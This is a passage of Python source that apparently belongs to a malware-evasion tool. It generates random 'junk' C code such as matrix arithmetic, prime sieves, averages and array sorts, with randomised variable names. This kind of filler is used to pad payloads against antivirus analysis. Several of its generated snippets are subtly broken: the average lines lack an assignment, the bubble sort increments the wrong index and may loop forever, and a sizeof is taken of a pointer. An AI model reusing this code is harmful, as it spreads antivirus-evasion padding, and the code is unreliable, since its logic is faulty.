        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "float (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr2 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr3 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 100;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 100;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] +" + Randmatr2 + "[" + Randflag + "][" + Randflag2 + "];\n}}"
        Junkcode += "free(" + Randmatr + ");free(" + Randmatr2 + ");free(" + Randmatr3 + ");\n"

    elif number == 8: # Randmatrix 3

        Randi = str(random.randint(1*H,9*H))
        Randj = str(random.randint(1*H,9*H))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()

        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "float (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr2 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr3 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 2000;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 2000;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] - " + Randmatr2 + "[" + Randflag + "][" + Randflag2 + "];\n}}"
        Junkcode += "free(" + Randmatr + ");free(" + Randmatr2 + ");free(" + Randmatr3 + ");\n"


    elif number == 9: # Randmatrix 4

        Randi = str(random.randint(1*H,9*H))
        Randj = str(random.randint(1*H,9*H))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()

        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "float (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr2 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr3 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 1000;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 1000;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] *" + Randmatr2 + "[" + Randflag + "][" + Randflag2 + "];\n}}"
        Junkcode += "free(" + Randmatr + ");free(" + Randmatr2 + ");free(" + Randmatr3 + ");\n"



    elif number == 10: # Randmatrix 5

        Randi = str(random.randint(1*H,9*H))
        Randj = str(random.randint(1*H,9*H))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()

        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "float (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr2 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr3 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 50;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 50;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] /" + Randmatr2 + "[" + Randflag + "][" + Randflag2 + "];\n}}"
        Junkcode += "free(" + Randmatr + ");free(" + Randmatr2 + ");free(" + Randmatr3 + ");\n"


    elif number == 11: # Randmatrix 6

        Randi = str(random.randint(1*H,9*H))
        Randj = str(random.randint(1*H,9*H))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()

        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "float (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr2 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "float (*" + Randmatr3 + ")[" + Randj + "] = malloc(sizeof(float) * " + Randi + " * " + Randj + ");\n" 
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 500;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 500;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = sqrt(" + Randmatr + "[" + Randflag + "][" + Randflag2 + "] /" + Randmatr2 + "[" + Randflag + "][" + Randflag2 + "]);\n}}"
        Junkcode += "free(" + Randmatr + ");free(" + Randmatr2 + ");free(" + Randmatr3 + ");\n"



    elif number == 12: # pow counter 

        Randsmall = str(random.uniform(1.000001000,1.000003000))
        Randsmall2 = str(random.uniform(1.000001000,1.000003000))
        Randbig = str(random.randrange(10*H,99*H,10))
        Randcpt= varname_creator()
        Randi = varname_creator()

        Junkcode += "double " + Randcpt + "  = " + Randsmall + ";\n"
        Junkcode += "double " + Randi + " = " + Randsmall2 + ";\n"
        Junkcode += "while(" + Randcpt + " < " + Randbig + "){\n"
        Junkcode += Randcpt + " = pow(" + Randcpt + "," + Randi + ");}\n"

    elif number == 13: #BacktoNumb 

        Randbig1 = str(random.randrange(10*H,99*H,10))
        Randcpt= varname_creator()

        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "while ( " + Randcpt + " > " + str(random.randrange(10,99,2)) + " ){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;}\n"

    elif number == 14: # double-Twin tower

        Randbig1 = str(random.randrange(50*H,99*H,10))
        Randbig2 = str(random.randrange(30*H,77*H,10))
        Randbig3 = str(random.randrange(10*H,55*H,10))
        Randbig4 = str(random.randrange(10*H,33*H,10))
        Randcpt= varname_creator()
        Randcpt2= varname_creator()
        Randcpt3= varname_creator()
        Randcpt4= varname_creator()
        Randi = varname_creator()

        Junkcode += "int " + Randcpt3 + "  = " + Randbig3 + ";\n"
        Junkcode += "int " + Randcpt4 + " = " + Randbig4 + ";\n"
        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "int " + Randcpt2 + " = " + Randbig2 + ";\n"
        Junkcode += "while ( " + Randcpt + " > 0 ){\n"
        Junkcode += "if (" + Randcpt + " > " + Randcpt2 + "){\n"
        Junkcode += "if (" + Randcpt + " > " + Randcpt3 + "){\n"
        Junkcode += "if (" + Randcpt + " > " + Randcpt4 + "){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;\n"
        Junkcode += "}else{\n"
        Junkcode += Randcpt4 + " = " + Randcpt4 + " - 1;\n"
        Junkcode += "}}else{\n"
        Junkcode += "if (" + Randcpt3 + " > " + Randcpt4 + "){\n"
        Junkcode += Randcpt3 + " = " + Randcpt3 + " - 1;\n"
        Junkcode += "}else{\n"
        Junkcode += Randcpt4 + " = " + Randcpt4 + " - 1;\n"
        Junkcode += "}}}else{\n"
        Junkcode += "if (" + Randcpt2 + " > " + Randcpt3 + "){\n"
        Junkcode += "if (" + Randcpt2 + " > " + Randcpt4 + "){\n"
        Junkcode += Randcpt2 + " = " + Randcpt2 + " - 1;\n"
        Junkcode += "}else{\n"
        Junkcode += Randcpt4 + " = " + Randcpt4 + " - 1;\n"
        Junkcode += "}}else{\n"
        Junkcode += "if (" + Randcpt3 + " > " + Randcpt4 + "){\n"
        Junkcode += Randcpt3 + " = " + Randcpt3 + " - 1;\n"
        Junkcode += "}else{\n"
        Junkcode += Randcpt4 + " = " + Randcpt4 + " - 1;}}}\n"
        Junkcode += "printf(\"%d\"," + Randcpt + ");}\n"


    elif number == 15: # Primes number in range using the Sieve of Sundaram 

        RandArraySize = varname_creator()
        RandRange = str(random.randint(10*H,99*H))
        RandPrimeVar = varname_creator() 
        RandPrimeNumb = varname_creator()
        RandSizeVar = varname_creator()
        IsPrime = varname_creator()
        RandN = varname_creator() 
        Randflag = varname_creator()
        Randflag2 = varname_creator()

        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + RandPrimeVar + " = 0;\n"
        Junkcode += "int " + RandArraySize + " = " + RandRange + ";\n"
        Junkcode += "int " + RandN + " = " + RandRange + " / 2;\n"
        Junkcode += "int " + RandSizeVar + ";\n"
        Junkcode += "int* " + IsPrime + " = malloc(sizeof(int) * (" + RandArraySize + " + 1));\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandN + ";" + Randflag + "++){\n" 
        Junkcode += IsPrime + "[" + Randflag + "] = " + Randflag + ";}\n"
        Junkcode += "for(" + Randflag + " = 1;" + Randflag + " < " + RandN + ";" + Randflag + "++){\n"
        Junkcode += "for(" + Randflag2 + " = " + Randflag + ";" + Randflag2 + " <= (" + RandN + " - " + Randflag + ")/(2 * " + Randflag + " + 1);" + Randflag2 + "++){\n"  
        Junkcode += IsPrime + "[" + Randflag + " + " + Randflag2 + " + 2 * " + Randflag + " + " + Randflag2 + "] = 0;}}\n"
        Junkcode += "if(" + RandArraySize + " > 2){\n"
        Junkcode += IsPrime + "[" + RandPrimeVar + "++] = 2;}\n"
        Junkcode += "for(" + Randflag + " = 1;" + Randflag + " < " + RandN + ";" + Randflag + "++){\n"
        Junkcode += "if(" + IsPrime + "[" + Randflag + "] != 0){\n"
        Junkcode += IsPrime + "[" + RandPrimeVar + "++] = " + Randflag + " * 2 + 1;}}\n"
        Junkcode += RandSizeVar + " = sizeof " + IsPrime + " / sizeof(int);\n"
        Junkcode += "int " + RandPrimeNumb + " = 0;\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandSizeVar + ";" + Randflag + "++){\n"       
        Junkcode += "if(" + IsPrime + "[" + Randflag + "] != 0){\n"
        Junkcode += RandPrimeNumb + " ++;}}\n"
        Junkcode += "free(" + IsPrime +");\n"

    elif number == 16: # Primes number in range using the Sieve of Eratosthenes 

        RandRange = str(random.randint(10*H,99*H))
        RandPrimeVar = varname_creator() 
        RandVar = varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()

        Junkcode += "unsigned long long int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int *" + RandPrimeVar + ";\n"    
        Junkcode += "int " + RandVar + " = 1;\n"  
        Junkcode += RandPrimeVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 2;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandPrimeVar + "[" + Randflag + "] = 1;}\n"
        Junkcode += "for(" + Randflag + " = 2;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += "if(" + RandPrimeVar + "[" + Randflag + "]){\n"
        Junkcode += "for(" + Randflag2 + " = " + Randflag + ";" + Randflag + " * " + Randflag2 + " < " + RandRange + ";" + Randflag2 + "++){\n"
        Junkcode += RandPrimeVar + "[" + Randflag + " * " + Randflag2 + "] = 0;}}}\n"
        Junkcode += "free(" + RandPrimeVar + ");\n"

    elif number == 17: # Random numbers 

        RandRange = str(random.randint(10*H,99*H))
        RandPrimeVar = varname_creator() 
        RandVar = varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()

        Junkcode += "int " + Randflag + "," + Randflag2 + " = 0;\n"
        Junkcode += "float* " + RandVar + " = malloc(sizeof(float) * " + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += Randflag2 + " = rand() % 400;\n"
        Junkcode += "if(" + Randflag2 + " > 360){\n"
        Junkcode += RandVar + "[" + Randflag + "] = 0;\n"
        Junkcode += "}else if(" + Randflag2 + " < 0){\n"
        Junkcode += RandVar + "[" + Randflag + "] = 0;\n"
        Junkcode += "}else{\n"
        Junkcode += RandVar + "[" + Randflag + "] = " + Randflag2 + " * 0.1 / 360;\n}}"
        Junkcode += "free(" + RandVar + ");\n"     

    elif number == 18: # Average 1

        RandRange = str(random.randint(10*H,99*H))
        RandSum = varname_creator()
        RandSum2 = varname_creator()
        RandAverage = varname_creator()
        RandVariance = varname_creator()
        RandDevStd = varname_creator() 
        RandVar = varname_creator()
        Randflag = varname_creator()

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int " + RandSum + " = 0;int " + RandSum2 + " = 0;\n"
        Junkcode += "float " + RandAverage + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 30;}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandSum + " = " + RandSum + " + " + RandVar + "[" + Randflag + "];}\n"
        Junkcode += RandAverage + "/((float)" + RandRange + ");\n"
        Junkcode += "free(" + RandVar + ");\n"

    elif number == 19: # Average 2

        RandRange = str(random.randint(10*H,99*H))
        RandSum = varname_creator()
        RandSum2 = varname_creator()
        RandAverage = varname_creator()
        RandVariance = varname_creator()
        RandDevStd = varname_creator() 
        RandVar = varname_creator()
        Randflag = varname_creator()

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int " + RandSum + " = 0;int " + RandSum2 + " = 0;\n"
        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "float " + RandAverage + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 25;\n"
        Junkcode += RandSum + " = " + RandSum + " + " + RandVar + "[" + Randflag + "];}\n"
        Junkcode += RandAverage + "/((float)" + RandRange + ");\n"
        Junkcode += "free(" + RandVar + ");\n"


    elif number == 20: # Average,Variance & Standard Deviation

        RandRange = str(random.randint(10*H,99*H))
        RandSum = varname_creator()
        RandSum2 = varname_creator()
        RandAverage = varname_creator()
        RandVariance = varname_creator()
        RandDevStd = varname_creator() 
        RandVar = varname_creator()
        Randflag = varname_creator()

        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int " + RandSum + " = 0;int " + RandSum2 + " = 0;\n"
        Junkcode += "float " + RandAverage + "," + RandVariance + "," + RandDevStd + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 35;}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandSum + " = " + RandSum + " + " + RandVar + "[" + Randflag + "];}\n"
        Junkcode += RandAverage + "/((float)" + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandSum2 + " = " + RandSum2 + " + pow((" + RandVar + "[" + Randflag + "]" + " - " + RandAverage + "),2);}\n"
        Junkcode += RandVariance + " = " + RandSum2 + "/((float)" + RandRange + ");\n"
        Junkcode += RandDevStd + " = sqrt(" + RandVariance + ");\n" 
        Junkcode += "free(" + RandVar + ");\n"

    elif number == 21: # Reverse Array 1

        RandRange = str(random.randint(10*H,99*H))
        RandSum = varname_creator() 
        RandVar = varname_creator()
        RandRevVar = varname_creator()
        Randflag = varname_creator()
        RandLenght = varname_creator()

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandRevVar + " = (int*)malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int " + RandLenght + " = " + RandRange + " - 1;\n"       
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 300;}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandRevVar + "[" + Randflag + "] = " + RandVar + "[" + RandLenght + "];\n"
        Junkcode += RandLenght + " = " + RandLenght + " - 1;}\n"
        Junkcode += "free(" + RandVar + ");free(" + RandRevVar + ");\n"

    elif number == 22: # Reverse Array 2

        RandRange = str(random.randint(10*H,99*H))
        RandSum = varname_creator() 
        RandVar = varname_creator()
        RandRevVar = varname_creator()
        Randflag = varname_creator()
        RandLenght = varname_creator()

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandRevVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int " + RandLenght + " = " + RandRange + " - 1;\n"       
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 300;\n"
        Junkcode += RandRevVar + "[" + Randflag + "] = " + RandVar + "[" + RandLenght + "];\n"
        Junkcode += RandLenght + " = " + RandLenght + " - 1;}\n"
        Junkcode += "free(" + RandVar + ");free(" + RandRevVar + ");\n"



    elif number == 23: # Check if matrix is sparse 1 

        Randi = str(random.randint(1*H,9*H))
        Randj = str(random.randint(1*H,9*H))
        Randmatr= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        RandIntResult = varname_creator()
        RandIsSparse = varname_creator()

        Junkcode += "int " + RandIntResult + " = 0;\n"
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + RandIsSparse + " = 0;\n"
        Junkcode += "int (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(int) * " + Randi + " * " + Randj + ");\n"              
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n"
        Junkcode += "for(" + Randflag2 + " = 0;" + Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "][" + Randflag2 + "] = rand() % 100;\n"
        Junkcode += "if(" + Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "] == 0){\n"
        Junkcode += RandIsSparse + "++;}}}\n"
        Junkcode += "if(" + RandIsSparse + " == ((" + Randi + " * " + Randj + ") / 2)){\n"
        Junkcode += RandIntResult + " = 1;}\n"
        Junkcode += "free(" + Randmatr + ");\n"


    elif number == 24: # Check if matrix is sparse 2 

        Randi = str(random.randint(1*H,9*H))
        Randj = str(random.randint(1*H,9*H))
        Randmatr= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        RandIntResult = varname_creator()
        RandIsSparse = varname_creator()

        Junkcode += "int (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(int) * " + Randi + " * " + Randj + ");\n"
        Junkcode += "int " + RandIsSparse + " = 0;\n"
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + RandIntResult + " = 1;\n"               
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n"
        Junkcode += "for(" + Randflag2 + " = 0;" + Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "][" + Randflag2 + "] = rand() % 100;}}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n"
        Junkcode += "for(" + Randflag2 + " = 0;" + Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += "if(" + Randmatr + "[" + Randflag + "][" + Randflag2 + "] == 0){\n"
        Junkcode += RandIsSparse + "++;\n}}}"
        Junkcode += "if(" + RandIsSparse + " != ((" + Randi + " * " + Randj + ") / 2)){\n"
        Junkcode += RandIntResult + " = 0;}\n"
        Junkcode += "free(" + Randmatr + ");\n"


    elif number == 25: # BacktoNumb2 

        Randbig1 = str(random.randrange(10*H,99*H,10))
        Randcpt= varname_creator()
        Randcpt2= varname_creator()

        Junkcode += "int " + Randcpt + ";\n"
        Junkcode += "int " + Randcpt2 + " = " + Randbig1 + ";\n"
        Junkcode += "for(" + Randcpt + " = " + Randbig1 + ";" + Randcpt + " > " + str(random.randrange(10,99,2)) + ";" + Randcpt + "--){\n"
        Junkcode += Randcpt2 + " = " + Randcpt2 + " - 1;}\n"

    elif number == 26: # Double Reverse Array 1 

        RandRange = str(random.randint(10*H,99*H))
        RandSum = varname_creator() 
        RandVar = varname_creator()
        RandRevVar = varname_creator()
        RandVar2 = varname_creator()
        RandRevVar2 = varname_creator()
        Randflag = varname_creator()
        RandLenght = varname_creator()

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandVar2 + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandRevVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandRevVar2 + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int " + RandLenght + " = " + RandRange + " - 1;\n"       
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 300;\n"
        Junkcode += RandVar2 + "[" + Randflag + "] = rand() % 300;}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandRevVar + "[" + Randflag + "] = " + RandVar + "[" + RandLenght + "];\n"
        Junkcode += RandRevVar2 + "[" + Randflag + "] = " + RandVar2 + "[" + RandLenght + "];\n"
        Junkcode += RandLenght + " = " + RandLenght + " - 1;}\n"
        Junkcode += "free(" + RandVar + ");free(" + RandVar2 + ");free(" + RandRevVar + ");free(" + RandRevVar2 + ");\n"


    elif number == 27: # Double Reverse Array 2

        RandRange = str(random.randint(10*H,99*H))
        RandSum = varname_creator() 
        RandVar = varname_creator()
        RandRevVar = varname_creator()
        RandVar2 = varname_creator()
        RandRevVar2 = varname_creator()
        Randflag = varname_creator()
        RandLenght = varname_creator()

        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandVar2 + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandRevVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandRevVar2 + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int " + RandLenght + " = " + RandRange + " - 1;\n"       
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 300;\n"
        Junkcode += RandVar2 + "[" + Randflag + "] = rand() % 300;\n"
        Junkcode += RandRevVar + "[" + Randflag + "] = " + RandVar + "[" + RandLenght + "];\n"
        Junkcode += RandRevVar2 + "[" + Randflag + "] = " + RandVar2 + "[" + RandLenght + "];\n"
        Junkcode += RandLenght + " = " + RandLenght + " - 1;}\n"
        Junkcode += "free(" + RandVar + ");free(" + RandVar2 + ");free(" + RandRevVar + ");free(" + RandRevVar2 + ");\n"

    elif number == 28: # Average,Variance & Standard Deviation 2  

        RandRange = str(random.randint(10*H,99*H))
        RandSum = varname_creator()
        RandSum2 = varname_creator()
        RandAverage = varname_creator()
        RandVariance = varname_creator()
        RandDevStd = varname_creator() 
        RandVar = varname_creator()
        Randflag = varname_creator()

        Junkcode += "int " + RandSum + " = 0;int " + RandSum2 + " = 0;\n"
        Junkcode += "int *" + RandVar + " = malloc(sizeof(int)*" + RandRange + ");\n"
        Junkcode += "float " + RandAverage + "," + RandVariance + "," + RandDevStd + ";\n"
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 35;\n"
        Junkcode += RandSum + " = " + RandSum + " + " + RandVar + "[" + Randflag + "];}\n"
        Junkcode += RandAverage + "/((float)" + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandSum2 + " = " + RandSum2 + " + pow((" + RandVar + "[" + Randflag + "]" + " - " + RandAverage + "),2);}\n"
        Junkcode += RandVariance + " = " + RandSum2 + "/((float)" + RandRange + ");\n"
        Junkcode += RandDevStd + " = sqrt(" + RandVariance + ");\n" 
        Junkcode += "free(" + RandVar + ");\n"


    elif number == 29: # Bubble Sort int array

        RandRange = str(random.randint(10*H,99*H))
        RandVar = varname_creator()
        RandVar2 = varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()

        Junkcode += "int *" + RandVar + " = malloc(sizeof(int)*" + RandRange + ");\n"
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int " + Randflag2 + ";\n"
        Junkcode += "int " + RandVar2 + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 10000 ;}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += "for(" + Randflag2 + " = 0;" + Randflag2 + " < (" + RandRange + " - " + Randflag + " - 1);" + Randflag + "++){\n"
        Junkcode += "if(" + RandVar + "[" + Randflag + "] > " + RandVar + "[" + Randflag2 + " + 1]){"
        Junkcode += RandVar2 + " = " + RandVar + "[" + Randflag2 + "];\n"
        Junkcode += RandVar + "[" + Randflag2 + "] = " + RandVar + "[" + Randflag + " + 1];\n"
        Junkcode += RandVar + "[" + Randflag2 + " + 1] = " + RandVar2 + ";}}}\n" 
        Junkcode += "free(" + RandVar + ");\n"


    elif number == 30: # Bubble Sort float array

